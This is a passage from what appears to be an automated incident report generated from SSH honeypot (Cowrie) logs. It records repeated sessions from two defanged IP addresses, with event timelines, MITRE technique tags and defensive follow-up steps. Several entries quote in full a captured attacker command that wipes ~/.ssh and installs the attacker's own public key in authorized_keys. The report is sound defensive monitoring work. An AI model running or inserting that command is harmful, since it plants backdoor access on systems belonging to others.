| **First Seen** | 2026-05-03 21:25 |
| **Last Seen** | 2026-05-03 21:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:25:27` | `cowrie.session.connect` |
| `2026-05-03 21:25:27` | `cowrie.client.version` |
| `2026-05-03 21:25:27` | `cowrie.client.kex` |
| `2026-05-03 21:25:27` | `cowrie.login.success` |
| `2026-05-03 21:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cde3dc8bfee

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:26 |
| **Last Seen** | 2026-05-03 21:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:26:18` | `cowrie.session.connect` |
| `2026-05-03 21:26:18` | `cowrie.client.version` |
| `2026-05-03 21:26:18` | `cowrie.client.kex` |
| `2026-05-03 21:26:19` | `cowrie.login.success` |
| `2026-05-03 21:26:19` | `cowrie.session.params` |
| `2026-05-03 21:26:19` | `cowrie.command.input` |
| `2026-05-03 21:26:19` | `cowrie.command.failed` |
| `2026-05-03 21:26:19` | `cowrie.log.closed` |
| `2026-05-03 21:26:19` | `cowrie.session.params` |
| `2026-05-03 21:26:19` | `cowrie.command.input` |
| `2026-05-03 21:26:19` | `cowrie.session.file_download` |
| `2026-05-03 21:26:19` | `cowrie.log.closed` |
| `2026-05-03 21:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e321b2dd7671

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:26 |
| **Last Seen** | 2026-05-03 21:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:26:21` | `cowrie.session.connect` |
| `2026-05-03 21:26:21` | `cowrie.client.version` |
| `2026-05-03 21:26:21` | `cowrie.client.kex` |
| `2026-05-03 21:26:22` | `cowrie.login.success` |
| `2026-05-03 21:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71705a06eaab

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:27 |
| **Last Seen** | 2026-05-03 21:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:27:17` | `cowrie.session.connect` |
| `2026-05-03 21:27:17` | `cowrie.client.version` |
| `2026-05-03 21:27:17` | `cowrie.client.kex` |
| `2026-05-03 21:27:17` | `cowrie.login.success` |
| `2026-05-03 21:27:17` | `cowrie.session.params` |
| `2026-05-03 21:27:17` | `cowrie.command.input` |
| `2026-05-03 21:27:17` | `cowrie.command.failed` |
| `2026-05-03 21:27:18` | `cowrie.log.closed` |
| `2026-05-03 21:27:18` | `cowrie.session.params` |
| `2026-05-03 21:27:18` | `cowrie.command.input` |
| `2026-05-03 21:27:18` | `cowrie.session.file_download` |
| `2026-05-03 21:27:18` | `cowrie.log.closed` |
| `2026-05-03 21:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b1bc24195f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:27 |
| **Last Seen** | 2026-05-03 21:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:27:20` | `cowrie.session.connect` |
| `2026-05-03 21:27:20` | `cowrie.client.version` |
| `2026-05-03 21:27:20` | `cowrie.client.kex` |
| `2026-05-03 21:27:20` | `cowrie.login.success` |
| `2026-05-03 21:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5689c5c5800a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:29 |
| **Last Seen** | 2026-05-03 21:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:29:04` | `cowrie.session.connect` |
| `2026-05-03 21:29:04` | `cowrie.client.version` |
| `2026-05-03 21:29:04` | `cowrie.client.kex` |
| `2026-05-03 21:29:05` | `cowrie.login.success` |
| `2026-05-03 21:29:05` | `cowrie.session.params` |
| `2026-05-03 21:29:05` | `cowrie.command.input` |
| `2026-05-03 21:29:05` | `cowrie.command.failed` |
| `2026-05-03 21:29:05` | `cowrie.log.closed` |
| `2026-05-03 21:29:05` | `cowrie.session.params` |
| `2026-05-03 21:29:05` | `cowrie.command.input` |
| `2026-05-03 21:29:05` | `cowrie.session.file_download` |
| `2026-05-03 21:29:05` | `cowrie.log.closed` |
| `2026-05-03 21:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8154c4f4381

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:29 |
| **Last Seen** | 2026-05-03 21:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:29:07` | `cowrie.session.connect` |
| `2026-05-03 21:29:07` | `cowrie.client.version` |
| `2026-05-03 21:29:07` | `cowrie.client.kex` |
| `2026-05-03 21:29:08` | `cowrie.login.success` |
| `2026-05-03 21:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ba667232bb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:29 |
| **Last Seen** | 2026-05-03 21:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:29:56` | `cowrie.session.connect` |
| `2026-05-03 21:29:56` | `cowrie.client.version` |
| `2026-05-03 21:29:56` | `cowrie.client.kex` |
| `2026-05-03 21:29:56` | `cowrie.login.success` |
| `2026-05-03 21:29:57` | `cowrie.session.params` |
| `2026-05-03 21:29:57` | `cowrie.command.input` |
| `2026-05-03 21:29:57` | `cowrie.command.failed` |
| `2026-05-03 21:29:57` | `cowrie.log.closed` |
| `2026-05-03 21:29:57` | `cowrie.session.params` |
| `2026-05-03 21:29:57` | `cowrie.command.input` |
| `2026-05-03 21:29:57` | `cowrie.session.file_download` |
| `2026-05-03 21:29:57` | `cowrie.log.closed` |
| `2026-05-03 21:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17fce763a98d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:29 |
| **Last Seen** | 2026-05-03 21:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:29:59` | `cowrie.session.connect` |
| `2026-05-03 21:29:59` | `cowrie.client.version` |
| `2026-05-03 21:29:59` | `cowrie.client.kex` |
| `2026-05-03 21:29:59` | `cowrie.login.success` |
| `2026-05-03 21:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bddc95189c79

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:30 |
| **Last Seen** | 2026-05-03 21:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:30:48` | `cowrie.session.connect` |
| `2026-05-03 21:30:48` | `cowrie.client.version` |
| `2026-05-03 21:30:48` | `cowrie.client.kex` |
| `2026-05-03 21:30:49` | `cowrie.login.success` |
| `2026-05-03 21:30:49` | `cowrie.session.params` |
| `2026-05-03 21:30:49` | `cowrie.command.input` |
| `2026-05-03 21:30:49` | `cowrie.command.failed` |
| `2026-05-03 21:30:49` | `cowrie.log.closed` |
| `2026-05-03 21:30:49` | `cowrie.session.params` |
| `2026-05-03 21:30:49` | `cowrie.command.input` |
| `2026-05-03 21:30:50` | `cowrie.session.file_download` |
| `2026-05-03 21:30:50` | `cowrie.log.closed` |
| `2026-05-03 21:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ccb881ed92

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:30 |
| **Last Seen** | 2026-05-03 21:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:30:51` | `cowrie.session.connect` |
| `2026-05-03 21:30:51` | `cowrie.client.version` |
| `2026-05-03 21:30:51` | `cowrie.client.kex` |
| `2026-05-03 21:30:52` | `cowrie.login.success` |
| `2026-05-03 21:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef79a999944

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:32 |
| **Last Seen** | 2026-05-03 21:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:32:40` | `cowrie.session.connect` |
| `2026-05-03 21:32:40` | `cowrie.client.version` |
| `2026-05-03 21:32:40` | `cowrie.client.kex` |
| `2026-05-03 21:32:40` | `cowrie.login.success` |
| `2026-05-03 21:32:40` | `cowrie.session.params` |
| `2026-05-03 21:32:40` | `cowrie.command.input` |
| `2026-05-03 21:32:40` | `cowrie.command.failed` |
| `2026-05-03 21:32:40` | `cowrie.log.closed` |
| `2026-05-03 21:32:41` | `cowrie.session.params` |
| `2026-05-03 21:32:41` | `cowrie.command.input` |
| `2026-05-03 21:32:41` | `cowrie.session.file_download` |
| `2026-05-03 21:32:41` | `cowrie.log.closed` |
| `2026-05-03 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01752cdfff7c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:32 |
| **Last Seen** | 2026-05-03 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:32:43` | `cowrie.session.connect` |
| `2026-05-03 21:32:43` | `cowrie.client.version` |
| `2026-05-03 21:32:43` | `cowrie.client.kex` |
| `2026-05-03 21:32:43` | `cowrie.login.success` |
| `2026-05-03 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90700f8db3f

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:20 |
| **Last Seen** | 2026-05-03 22:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:20:31` | `cowrie.session.connect` |
| `2026-05-03 22:20:31` | `cowrie.client.version` |
| `2026-05-03 22:20:31` | `cowrie.client.kex` |
| `2026-05-03 22:20:31` | `cowrie.login.success` |
| `2026-05-03 22:20:31` | `cowrie.session.params` |
| `2026-05-03 22:20:31` | `cowrie.command.input` |
| `2026-05-03 22:20:31` | `cowrie.command.failed` |
| `2026-05-03 22:20:31` | `cowrie.log.closed` |
| `2026-05-03 22:20:31` | `cowrie.session.params` |
| `2026-05-03 22:20:31` | `cowrie.command.input` |
| `2026-05-03 22:20:31` | `cowrie.session.file_download` |
| `2026-05-03 22:20:31` | `cowrie.log.closed` |
| `2026-05-03 22:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc29282e2d9e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:20 |
| **Last Seen** | 2026-05-03 22:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:20:32` | `cowrie.session.connect` |
| `2026-05-03 22:20:32` | `cowrie.client.version` |
| `2026-05-03 22:20:32` | `cowrie.client.kex` |
| `2026-05-03 22:20:32` | `cowrie.login.success` |
| `2026-05-03 22:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742d48d01e7d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:21 |
| **Last Seen** | 2026-05-03 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:21:18` | `cowrie.session.connect` |
| `2026-05-03 22:21:18` | `cowrie.client.version` |
| `2026-05-03 22:21:18` | `cowrie.client.kex` |
| `2026-05-03 22:21:18` | `cowrie.login.success` |
| `2026-05-03 22:21:18` | `cowrie.session.params` |
| `2026-05-03 22:21:18` | `cowrie.command.input` |
| `2026-05-03 22:21:18` | `cowrie.command.failed` |
| `2026-05-03 22:21:18` | `cowrie.log.closed` |
| `2026-05-03 22:21:18` | `cowrie.session.params` |
| `2026-05-03 22:21:18` | `cowrie.command.input` |
| `2026-05-03 22:21:18` | `cowrie.session.file_download` |
| `2026-05-03 22:21:18` | `cowrie.log.closed` |
| `2026-05-03 22:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d59d2737d4a0

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:21 |
| **Last Seen** | 2026-05-03 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:21:20` | `cowrie.session.connect` |
| `2026-05-03 22:21:20` | `cowrie.client.version` |
| `2026-05-03 22:21:20` | `cowrie.client.kex` |
| `2026-05-03 22:21:20` | `cowrie.login.success` |
| `2026-05-03 22:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2730fc5d99

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:22 |
| **Last Seen** | 2026-05-03 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
